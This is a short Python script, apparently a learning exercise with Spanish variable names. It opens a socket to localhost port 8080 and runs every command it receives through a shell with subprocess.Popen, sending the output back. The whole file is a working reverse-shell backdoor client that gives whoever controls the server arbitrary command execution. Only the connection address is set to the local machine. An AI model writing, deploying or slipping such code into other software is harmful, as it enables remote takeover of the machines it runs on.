import socket
import subprocess

cliente = socket.socket()
try:
    cliente.connect(("localhost", 8080))
    
    cliente.send("1".encode('ascii'))
    while True:
        
        comandoBytes= cliente.recv(2024)
        
        comandoModificado= comandoBytes.decode("ascii")
        comando= subprocess.Popen(
            comandoModificado,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            
        )
        cliente.send(comando.stdout.read())
        
except Exception as e:
    raise e
        